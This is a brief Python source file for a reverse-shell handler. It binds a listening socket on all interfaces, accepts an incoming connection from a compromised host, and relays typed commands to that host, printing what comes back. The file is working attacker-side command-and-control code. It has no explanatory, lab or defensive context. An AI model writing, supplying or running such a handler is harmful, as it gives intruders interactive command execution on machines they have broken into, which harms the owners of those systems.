import socket

class ShellHandler:
    def __init__(self, port):
        self.port = port
        self.sock = None

    def start_listener(self):
        """Listens for incoming reverse shell connections."""
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind(('0.0.0.0', self.port))
        self.sock.listen(1)
        
        print(f"[*] Listening on port {self.port}...")
        
        try:
            client_sock, addr = self.sock.accept()
            print(f"[+] Connection established from {addr[0]}")
            self.interactive_session(client_sock)
        except KeyboardInterrupt:
            print("\n[*] Shutting down.")
        finally:
            self.sock.close()

    def interactive_session(self, client_sock):
        """Manages the interactive terminal session."""
        with client_sock:
            while True:
                command = input("Shell> ").strip()
                if not command:
                    continue
                
                client_sock.sendall(command.encode('utf-8'))
                
                if command.lower() == 'exit':
                    break
                
                # Receive response (looping might be needed for very large outputs)
                response = client_sock.recv(16384).decode('utf-8')
                print(response)